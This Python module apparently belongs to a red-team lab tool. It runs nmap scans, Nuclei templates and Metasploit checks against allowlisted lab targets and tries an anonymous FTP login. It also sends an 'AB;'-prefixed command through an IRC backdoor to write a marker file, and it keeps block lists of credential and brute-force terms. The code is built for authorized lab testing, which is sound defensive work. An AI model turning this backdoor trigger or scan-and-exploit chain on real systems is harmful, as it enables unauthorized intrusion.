from __future__ import annotations

import json
import ipaddress
import re
import shutil
import socket
import subprocess
import time
from dataclasses import asdict, dataclass
from ftplib import FTP
from html.parser import HTMLParser
from urllib.error import URLError
from urllib.request import Request, urlopen

from .capabilities import select_capabilities_for_services
from .config_loader import ROOT, load_internal_capabilities_config, load_lab_config
from .docker_lab import CONTAINER, run_command


_LAB_CONFIG = load_lab_config()
_INTERNAL_CAPABILITIES_CONFIG = load_internal_capabilities_config()
LOCAL_TARGETS = set(_LAB_CONFIG["safety"]["allowed_targets"])
ALLOWED_CIDRS = [ipaddress.ip_network(cidr) for cidr in _LAB_CONFIG["safety"]["allowed_cidrs"]]
DEFAULT_TARGET = _LAB_CONFIG["safety"]["default_target"]
CONTAINER_PORTS = [int(port) for port in _LAB_CONFIG["scan"]["container_ports"]]
HOST_PORTS = [int(port) for port in _LAB_CONFIG["scan"]["host_ports"]]
HTTP_CONTAINER_PORTS = [int(port) for port in _LAB_CONFIG["scan"]["http_container_ports"]]
HTTP_HOST_PORTS = [int(port) for port in _LAB_CONFIG["scan"]["http_host_ports"]]
EXPLOIT_MARKER = _INTERNAL_CAPABILITIES_CONFIG["proof_marker"]


def default_ports_for_target(target: str) -> list[int]:
    return HOST_PORTS if target in {"127.0.0.1", "localhost"} else CONTAINER_PORTS


@dataclass
class ToolResult:
    tool: str
    command: list[str] | None
    returncode: int
    stdout: str
    stderr: str
    elapsed_seconds: float


class TitleParser(HTMLParser):
    def __init__(self) -> None:
        super().__init__()
        self.in_title = False
        self.title_parts: list[str] = []

    def handle_starttag(self, tag: str, attrs):
        if tag.lower() == "title":
            self.in_title = True

    def handle_endtag(self, tag: str):
        if tag.lower() == "title":
            self.in_title = False

    def handle_data(self, data: str):
        if self.in_title:
            self.title_parts.append(data.strip())

    @property
    def title(self) -> str:
        return " ".join(part for part in self.title_parts if part).strip()


def validate_target(target: str) -> str:
    if target in LOCAL_TARGETS:
        return target
    try:
        ip = ipaddress.ip_address(target)
    except ValueError as exc:
        raise ValueError(f"Refusing to scan target '{target}'. Target must be localhost or an allowed lab IP.") from exc
    if not any(ip in network for network in ALLOWED_CIDRS):
        allowed = [*sorted(LOCAL_TARGETS), *(str(network) for network in ALLOWED_CIDRS)]
        raise ValueError(f"Refusing to scan target '{target}'. Allowed lab targets/CIDRs: {', '.join(allowed)}")
    return target


def run_local_command(command: list[str], timeout: int = 120) -> ToolResult:
    started = time.perf_counter()
    try:
        proc = subprocess.run(command, capture_output=True, text=True, timeout=timeout, check=False)
    except subprocess.TimeoutExpired as exc:
        elapsed = time.perf_counter() - started
        stdout = exc.stdout or ""
        stderr = exc.stderr or ""
        if isinstance(stdout, bytes):
            stdout = stdout.decode("utf-8", errors="replace")
        if isinstance(stderr, bytes):
            stderr = stderr.decode("utf-8", errors="replace")
        return ToolResult(
            tool=command[0],
            command=command,
            returncode=124,
            stdout=stdout.strip(),
            stderr=(stderr.strip() + f"\nTimed out after {timeout} seconds").strip(),
            elapsed_seconds=elapsed,
        )
    elapsed = time.perf_counter() - started
    return ToolResult(
        tool=command[0],
        command=command,
        returncode=proc.returncode,
        stdout=proc.stdout.strip(),
        stderr=proc.stderr.strip(),
        elapsed_seconds=elapsed,
    )


def tcp_connect_check(target: str, ports: list[int] | None = None, timeout: float = 1.0) -> dict:
    target = validate_target(target)
    results = {}
    for port in ports or default_ports_for_target(target):
        started = time.perf_counter()
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(timeout)
            code = sock.connect_ex((target, port))
        results[str(port)] = {"open": code == 0, "elapsed_ms": round((time.perf_counter() - started) * 1000, 2)}
    return results


def nmap_service_scan(target: str, ports: list[int] | None = None) -> ToolResult:
    target = validate_target(target)
    selected_ports = ",".join(str(port) for port in (ports or default_ports_for_target(target)))
    command = [
        "nmap",
        "-sV",
        "-Pn",
        "--version-light",
        "--reason",
        "-p",
        selected_ports,
        target,
    ]
    return run_local_command(command, timeout=180)


def nmap_safe_scripts(target: str, ports: list[int] | None = None) -> ToolResult:
    target = validate_target(target)
    selected_ports = ",".join(str(port) for port in (ports or default_ports_for_target(target)))
    command = [
        "nmap",
        "-sV",
        "-Pn",
        "--script",
        "default,safe",
        "-p",
        selected_ports,
        target,
    ]
    return run_local_command(command, timeout=240)


def nmap_single_script(target: str, script_name: str, port: int) -> ToolResult:
    target = validate_target(target)
    command = [
        "nmap",
        "-sV",
        "-Pn",
        "--script",
        script_name,
        "-p",
        str(port),
        target,
    ]
    return run_local_command(command, timeout=90)


def http_probe(target: str, ports: list[int] | None = None) -> dict:
    target = validate_target(target)
    output = []
    default_http_ports = HTTP_HOST_PORTS if target in {"127.0.0.1", "localhost"} else HTTP_CONTAINER_PORTS
    for port in ports or default_http_ports:
        scheme = "https" if port in {443, 8443} else "http"
        url = f"{scheme}://{target}:{port}/"
        started = time.perf_counter()
        try:
            request = Request(url, headers={"User-Agent": "MedFlow-RedTeam-Lab/0.1"})
            with urlopen(request, timeout=4) as response:
                body = response.read(4096).decode("utf-8", errors="replace")
                parser = TitleParser()
                parser.feed(body)
                output.append(
                    {
                        "url": url,
                        "status": response.status,
                        "server": response.headers.get("Server", ""),
                        "title": parser.title,
                        "elapsed_ms": round((time.perf_counter() - started) * 1000, 2),
                    }
                )
        except URLError as exc:
            output.append({"url": url, "error": str(exc), "elapsed_ms": round((time.perf_counter() - started) * 1000, 2)})
        except Exception as exc:
            output.append({"url": url, "error": repr(exc), "elapsed_ms": round((time.perf_counter() - started) * 1000, 2)})
    return {"http_probe": output}


def select_exploit_candidate(target: str, services: list[dict[str, str]], limit: int = 1) -> dict:
    """Select the best capability candidates from observed service evidence."""
    target = validate_target(target)
    return select_capabilities_for_services(target, services, limit=limit)


def run_selected_exploit(
    target: str,
    selection: dict,
    use_sudo: bool = False,
    execution_mode: str = "safe",
) -> dict:
    """Execute selected capabilities through registered local runners."""
    selected_candidates = selection.get("selected_candidates") or ([selection.get("selected")] if selection and selection.get("selected") else [])
    if not selected_candidates:
        return {
            "allowed": True,
            "exploited": False,
            "verified": False,
            "reason": "No selected exploit candidate to execute.",
            "results": [],
        }
    results = []
    for selected in selected_candidates:
        results.append(run_one_selected_capability(target, selected, use_sudo=use_sudo, execution_mode=execution_mode))
    verified_results = [item for item in results if item.get("verified")]
    return {
        "allowed": True,
        "exploited": any(item.get("exploited") for item in results),
        "verified": bool(verified_results),
        "proof_output": "\n".join(
            f"{item.get('selected_exploit_id')}: {item.get('proof_output')}"
            for item in verified_results
            if item.get("proof_output")
        ).strip(),
        "cleanup_verified": all(item.get("cleanup_verified", True) for item in results),
        "results": results,
        "attempted": len(results),
        "successful": len(verified_results),
        "execution_mode": execution_mode,
    }


def run_one_selected_capability(
    target: str,
    selected: dict,
    use_sudo: bool = False,
    execution_mode: str = "safe",
) -> dict:
    exploit_id = selected.get("id")
    runner = selected.get("runner")
    if not selected.get("safe_to_execute", False) and not can_execute_aggressive(selected, execution_mode):
        return {
            "allowed": False,
            "exploited": False,
            "verified": False,
            "reason": f"Capability is metadata-only or not marked safe to execute in {execution_mode} mode.",
            "selected_exploit_id": exploit_id,
            "selected_exploit_name": selected.get("name"),
            "selection_score": selected.get("score"),
            "selection_reasons": selected.get("reasons", []),
        }
    if runner == "irc_backdoor_command":
        result = irc_backdoor_command_validation(target, selected, use_sudo=use_sudo)
    elif runner == "ftp_anonymous_login":
        result = ftp_anonymous_login_validation(target, selected)
    elif runner == "mysql_handshake_probe":
        result = mysql_handshake_probe_validation(target, selected)
    elif runner == "nmap_nse_script":
        result = nmap_nse_script_validation(target, selected, execution_mode=execution_mode)
    elif runner == "metasploit_module":
        result = metasploit_module_validation(target, selected, execution_mode=execution_mode)
    elif runner == "nuclei_template":
        result = nuclei_template_validation(target, selected, execution_mode=execution_mode)
    else:
        result = {
            "allowed": False,
            "exploited": False,
            "verified": False,
            "reason": f"Selected exploit runner '{runner}' is not registered.",
        }
    result["selected_exploit_id"] = exploit_id
    result["selected_exploit_name"] = selected.get("name")
    result["selection_score"] = selected.get("score")
    result["selection_reasons"] = selected.get("reasons", [])
    return result


def can_execute_aggressive(capability: dict, execution_mode: str) -> bool:
    if execution_mode != "aggressive_lab":
        return False
    runner = capability.get("runner")
    blocked_terms = {
        "brute",
        "cred",
        "creds",
        "credential",
        "credentials",
        "dump",
        "hash",
        "login",
        "pass",
        "passwd",
        "password",
        "relay",
        "dos",
    }
    if runner == "metasploit_module":
        module_path = capability.get("module_path") or ""
        module_type = capability.get("module_type") or ""
        lowered = f"{module_path} {capability.get('name', '')}".lower()
        if any(term in lowered for term in blocked_terms):
            return False
        return module_type in {"auxiliary", "exploit"} and allowed_tool_identifier(module_path)
    if runner == "nuclei_template":
        tags = {item.lower() for item in capability.get("tags", [])}
        template_path = capability.get("template_path") or ""
        lowered = f"{template_path} {capability.get('name', '')} {' '.join(tags)}".lower()
        if any(term in lowered for term in blocked_terms):
            return False
        return allowed_tool_identifier(template_path.replace("/", "_").replace(".", "_"))
    if runner != "nmap_nse_script":
        return False
    script_name = (capability.get("script_name") or "").lower()
    categories = {item.lower() for item in capability.get("categories", [])}
    blocked_name_terms = blocked_terms
    blocked_categories = {"brute", "dos"}
    if any(term in script_name for term in blocked_name_terms):
        return False
    return bool({"vuln", "exploit", "intrusive", "malware", "safe", "default"} & categories) and not (categories & blocked_categories)


def allowed_tool_identifier(value: str) -> bool:
    return bool(value) and bool(re.fullmatch(r"[A-Za-z0-9_./:-]+", value)) and ".." not in value


def selected_port(capability: dict) -> int | None:
    service = capability.get("matched_service", {})
    port = service.get("port") or first_configured_port(capability)
    return int(port) if str(port).isdigit() else None


def nmap_nse_script_validation(target: str, capability: dict, execution_mode: str = "safe") -> dict:
    categories = {item.lower() for item in capability.get("categories", [])}
    script_name = capability.get("script_name") or ""
    unsafe_name_terms = {"brute", "dump", "hash", "pass", "passwd", "password", "dos"}
    if any(term in script_name.lower() for term in unsafe_name_terms):
        return {
            "allowed": False,
            "exploited": False,
            "verified": False,
            "reason": "Nmap NSE script name indicates brute force, credential, hash, password, or DoS behavior.",
        }
    if {"brute", "dos"} & categories:
        return {
            "allowed": False,
            "exploited": False,
            "verified": False,
            "reason": "Nmap NSE script category is not allowed for automatic execution.",
        }
    if execution_mode == "safe" and not ({"safe", "default"} & categories):
        return {
            "allowed": False,
            "exploited": False,
            "verified": False,
            "reason": "Nmap NSE script is not in safe/default categories.",
        }
    if execution_mode == "aggressive_lab" and not can_execute_aggressive(capability, execution_mode) and not ({"safe", "default"} & categories):
        return {
            "allowed": False,
            "exploited": False,
            "verified": False,
            "reason": "Nmap NSE script is not allowed by aggressive lab policy.",
        }
    service = capability.get("matched_service", {})
    port = service.get("port") or first_configured_port(capability)
    if not script_name or not port:
        return {
            "allowed": False,
            "exploited": False,
            "verified": False,
            "reason": "Nmap NSE capability is missing script name or matched port.",
        }
    result = nmap_single_script(target, script_name, int(port))
    requires_vuln_evidence = bool({"vuln", "exploit", "intrusive", "malware"} & categories)
    vulnerable_evidence = nmap_script_reported_vulnerable(result.stdout)
    verified = result.returncode == 0 and (vulnerable_evidence if requires_vuln_evidence else True)
    if result.returncode != 0:
        reason = result.stderr[:1000] or "Nmap script execution failed."
    elif requires_vuln_evidence and not vulnerable_evidence:
        reason = "Nmap script completed, but did not report vulnerable evidence."
    else:
        reason = ""
    return {
        "allowed": True,
        "exploited": False,
        "verified": verified,
        "cleanup_verified": True,
        "target": target,
        "service": service.get("service", ""),
        "port": int(port),
        "proof_goal": f"Run Nmap NSE validation for {script_name}.",
        "proof_output": result.stdout[:1000] if verified or not requires_vuln_evidence else "",
        "stderr": result.stderr[:1000],
        "reason": reason,
        "elapsed_seconds": result.elapsed_seconds,
    }


def nmap_script_reported_vulnerable(stdout: str) -> bool:
    lowered = stdout.lower()
    evidence_terms = {
        "state: vulnerable",
        "state: likely vulnerable",
        "vulnerable:",
        "is vulnerable",
        "appears to be vulnerable",
        "has been backdoored",
        "backdoored",
        "exploit results",
        "cve-",
    }
    return any(term in lowered for term in evidence_terms)


def metasploit_module_validation(target: str, capability: dict, execution_mode: str = "safe") -> dict:
    target = validate_target(target)
    msfconsole = shutil.which("msfconsole")
    if not msfconsole:
        return {
            "allowed": False,
            "exploited": False,
            "verified": False,
            "reason": "msfconsole binary not found. Install Metasploit Framework to execute this capability.",
        }
    module_path = capability.get("module_path") or ""
    if not allowed_tool_identifier(module_path):
        return {
            "allowed": False,
            "exploited": False,
            "verified": False,
            "reason": "Metasploit module path failed validation.",
        }
    module_type = capability.get("module_type") or module_path.split("/", 1)[0]
    port = selected_port(capability)
    if port is None:
        return {
            "allowed": False,
            "exploited": False,
            "verified": False,
            "reason": "Metasploit capability is missing a matched or configured RPORT.",
        }
    action = "run" if module_type == "auxiliary" else "check"
    if module_type == "exploit" and execution_mode != "aggressive_lab":
        return {
            "allowed": False,
            "exploited": False,
            "verified": False,
            "reason": "Metasploit exploit modules are limited to check-mode in aggressive_lab execution mode.",
        }
    commands = [
        f"use {module_path}",
        f"set RHOSTS {target}",
        f"set RHOST {target}",
        f"set RPORT {port}",
        "set VERBOSE false",
        "setg ConnectTimeout 5",
        action,
        "exit -y",
    ]
    result = run_local_command([msfconsole, "-q", "-x", "; ".join(commands)], timeout=240)
    verified = metasploit_output_verified(result.stdout, module_type, action) and result.returncode == 0
    reason = ""
    if result.returncode != 0:
        reason = result.stderr[:1000] or "Metasploit execution failed."
    elif not verified:
        reason = "Metasploit module completed, but did not produce positive validation evidence."
    return {
        "allowed": True,
        "exploited": False,
        "verified": verified,
        "cleanup_verified": True,
        "target": target,
        "service": (capability.get("matched_service") or {}).get("service", ""),
        "port": port,
        "proof_goal": f"Run Metasploit {module_path} with action {action}.",
        "proof_output": result.stdout[:1500] if verified else "",
        "stderr": result.stderr[:1000],
        "reason": reason,
        "elapsed_seconds": result.elapsed_seconds,
        "metasploit_action": action,
    }


def metasploit_output_verified(stdout: str, module_type: str, action: str) -> bool:
    lowered = stdout.lower()
    if "failed to load module" in lowered or "unknown command" in lowered:
        return False
    if action == "check":
        return any(
            term in lowered
            for term in [
                "appears to be vulnerable",
                "the target is vulnerable",
                "check appears",
                "is vulnerable",
                "vulnerable",
            ]
        )
    if module_type == "auxiliary":
        negative_terms = ["auxiliary failed", "run failed", "failed:"]
        return not any(term in lowered for term in negative_terms) and bool(stdout.strip())
    return False


def nuclei_template_validation(target: str, capability: dict, execution_mode: str = "safe") -> dict:
    target = validate_target(target)
    nuclei = shutil.which("nuclei")
    if not nuclei:
        return {
            "allowed": False,
            "exploited": False,
            "verified": False,
            "reason": "nuclei binary not found. Install ProjectDiscovery Nuclei to execute this capability.",
        }
    template_root = ROOT / "data" / "capability_sources" / "nuclei-templates"
    template_path = capability.get("template_path") or ""
    if not allowed_tool_identifier(template_path.replace("/", "_").replace(".", "_")):
        return {
            "allowed": False,
            "exploited": False,
            "verified": False,
            "reason": "Nuclei template path failed validation.",
        }
    resolved_template = (template_root / template_path).resolve()
    if not str(resolved_template).startswith(str(template_root.resolve())) or not resolved_template.exists():
        return {
            "allowed": False,
            "exploited": False,
            "verified": False,
            "reason": "Nuclei template file is missing or outside the local template repository.",
        }
    port = selected_port(capability)
    scheme = "https" if port in {443, 8443} else "http"
    url = f"{scheme}://{target}:{port}/" if port else f"http://{target}/"
    result = run_local_command(
        [
            nuclei,
            "-u",
            url,
            "-t",
            str(resolved_template),
            "-jsonl",
            "-silent",
            "-no-color",
            "-duc",
        ],
        timeout=180,
    )
    verified = result.returncode == 0 and bool(result.stdout.strip())
    if result.returncode != 0:
        reason = result.stderr[:1000] or "Nuclei execution failed."
    elif not verified:
        reason = "Nuclei template completed, but produced no findings."
    else:
        reason = ""
    return {
        "allowed": True,
        "exploited": False,
        "verified": verified,
        "cleanup_verified": True,
        "target": target,
        "service": (capability.get("matched_service") or {}).get("service", ""),
        "port": port,
        "proof_goal": f"Run Nuclei template {template_path}.",
        "proof_output": result.stdout[:1500] if verified else "",
        "stderr": result.stderr[:1000],
        "reason": reason,
        "elapsed_seconds": result.elapsed_seconds,
        "nuclei_url": url,
    }


def first_configured_port(exploit: dict) -> int | None:
    ports = exploit.get("match", {}).get("ports") or []
    return int(ports[0]) if ports else None


def ftp_anonymous_login_validation(target: str, exploit: dict) -> dict:
    target = validate_target(target)
    port = first_configured_port(exploit)
    if port is None:
        return {
            "allowed": False,
            "exploited": False,
            "verified": False,
            "reason": "Selected FTP validation is missing match.ports in the capability definition.",
        }
    started = time.perf_counter()
    result: dict[str, object] = {
        "allowed": True,
        "target": target,
        "service": exploit.get("match", {}).get("service", "ftp"),
        "port": port,
        "proof_goal": exploit.get("proof_goal", "Attempt anonymous FTP login."),
        "exploited": False,
        "verified": False,
        "cleanup_verified": True,
    }
    try:
        ftp = FTP()
        ftp.connect(target, port, timeout=5)
        result["banner_preview"] = ftp.getwelcome()
        login_response = ftp.login("anonymous", "anonymous@example.com")
        result["login_response"] = login_response
        result["proof_output"] = f"Anonymous FTP login succeeded: {login_response}"
        result["verified"] = True
        ftp.quit()
    except Exception as exc:
        result["proof_output"] = ""
        result["reason"] = f"Anonymous FTP login did not succeed: {exc}"
    result["elapsed_seconds"] = round(time.perf_counter() - started, 3)
    return result


def mysql_handshake_probe_validation(target: str, exploit: dict) -> dict:
    target = validate_target(target)
    port = first_configured_port(exploit)
    if port is None:
        return {
            "allowed": False,
            "exploited": False,
            "verified": False,
            "reason": "Selected MySQL validation is missing match.ports in the capability definition.",
        }
    started = time.perf_counter()
    result: dict[str, object] = {
        "allowed": False,
        "exploited": False,
        "verified": False,
        "cleanup_verified": True,
        "target": target,
        "service": exploit.get("match", {}).get("service", "mysql"),
        "port": port,
        "proof_goal": exploit.get("proof_goal", "Probe MySQL handshake."),
    }
    try:
        with socket.create_connection((target, port), timeout=5) as sock:
            sock.settimeout(3)
            banner = sock.recv(128)
        result["allowed"] = True
        result["banner_hex_preview"] = banner[:64].hex()
        result["proof_output"] = "MySQL handshake received before authentication."
        result["verified"] = bool(banner)
    except Exception as exc:
        result["allowed"] = True
        result["reason"] = f"MySQL handshake probe failed: {exc}"
    result["elapsed_seconds"] = round(time.perf_counter() - started, 3)
    return result


def irc_backdoor_command_validation(target: str, exploit: dict, use_sudo: bool = False) -> dict:
    """Run the configured benign remote-command proof against an IRC lab service."""
    target = validate_target(target)
    if target != DEFAULT_TARGET:
        return {
            "allowed": False,
            "exploited": False,
            "reason": f"Exploit validation is restricted to the configured lab target {DEFAULT_TARGET}.",
        }
    ports = exploit.get("match", {}).get("ports") or []
    if not ports:
        return {
            "allowed": False,
            "exploited": False,
            "verified": False,
            "reason": "Selected exploit is missing match.ports in the capability definition.",
        }
    port = int(ports[0])

    result: dict[str, object] = {
        "allowed": True,
        "target": target,
        "service": exploit.get("match", {}).get("service", ""),
        "port": port,
        "marker": EXPLOIT_MARKER,
        "proof_goal": exploit.get("proof_goal", "Run configured benign proof command."),
        "exploited": False,
        "verified": False,
        "cleanup": False,
    }
    started = time.perf_counter()
    command = exploit.get("proof_command", "id > {marker}").format(marker=EXPLOIT_MARKER)
    preclean = run_command(
        ["docker", "exec", CONTAINER, "rm", "-f", EXPLOIT_MARKER],
        timeout=15,
        use_sudo=use_sudo,
    )
    result["preclean"] = preclean.returncode == 0
    sent = False
    for connect_attempt in range(1, 4):
        try:
            with socket.create_connection((target, port), timeout=5) as sock:
                sock.settimeout(2)
                try:
                    banner = sock.recv(4096).decode("utf-8", errors="replace")
                except Exception:
                    banner = ""
                result["banner_preview"] = banner[:300]
                result["connect_attempts"] = connect_attempt
                if "throttled" in banner.lower() and connect_attempt < 3:
                    result["throttle_observed"] = True
                    time.sleep(8)
                    continue
                sock.sendall(f"AB;{command}\n".encode("utf-8"))
                result["sent_benign_remote_command"] = True
                sent = True
                break
        except Exception as exc:
            result["error"] = repr(exc)
            if connect_attempt < 3:
                time.sleep(3)
                continue
            result["elapsed_seconds"] = round(time.perf_counter() - started, 3)
            return result
    if not sent:
        result["reason"] = "Could not send proof command to IRC service after retry/backoff."
        result["elapsed_seconds"] = round(time.perf_counter() - started, 3)
        return result

    verify = None
    for attempt in range(1, 11):
        time.sleep(0.5)
        verify = run_command(
            ["docker", "exec", CONTAINER, "cat", EXPLOIT_MARKER],
            timeout=15,
            use_sudo=use_sudo,
        )
        if verify.returncode == 0:
            result["verify_attempts"] = attempt
            break
    if verify is None:
        raise RuntimeError("verification loop did not run")
    result["verify_returncode"] = verify.returncode
    result["proof_output"] = verify.stdout
    result["verify_stderr"] = verify.stderr
    result["verification_available"] = verify.returncode == 0 or "permission denied" not in verify.stderr.lower()
    if "password is required" in verify.stderr.lower() or "terminal is required" in verify.stderr.lower():
        result["verification_available"] = False
        result["verification_note"] = "Docker verification requires running the CLI with Docker permissions, for example through sudo."
    result["verified"] = verify.returncode == 0
    result["exploited"] = verify.returncode == 0
    cleanup = run_command(
        ["docker", "exec", CONTAINER, "rm", "-f", EXPLOIT_MARKER],
        timeout=15,
        use_sudo=use_sudo,
    )
    result["cleanup"] = cleanup.returncode == 0
    result["cleanup_stderr"] = cleanup.stderr
    cleanup_verify = run_command(
        ["docker", "exec", CONTAINER, "test", "!", "-f", EXPLOIT_MARKER],
        timeout=15,
        use_sudo=use_sudo,
    )
    result["cleanup_verified"] = cleanup_verify.returncode == 0
    result["cleanup_verify_stderr"] = cleanup_verify.stderr
    result["elapsed_seconds"] = round(time.perf_counter() - started, 3)
    return result


def parse_nmap_open_services(nmap_output: str) -> list[dict[str, str]]:
    services = []
    for line in nmap_output.splitlines():
        match = re.match(r"^(\d+)/(tcp|udp)\s+open\s+(\S+)\s*(.*)$", line.strip())
        if match:
            services.append(
                {
                    "port": match.group(1),
                    "protocol": match.group(2),
                    "service": match.group(3),
                    "version": match.group(4).strip(),
                }
            )
    return services


def summarize_tool_result(result: ToolResult, max_chars: int = 3000) -> str:
    data = asdict(result)
    if len(data["stdout"]) > max_chars:
        data["stdout"] = data["stdout"][:max_chars].rstrip() + "\n[truncated]"
    if len(data["stderr"]) > 1000:
        data["stderr"] = data["stderr"][:1000].rstrip() + "\n[truncated]"
    return json.dumps(data, indent=2)
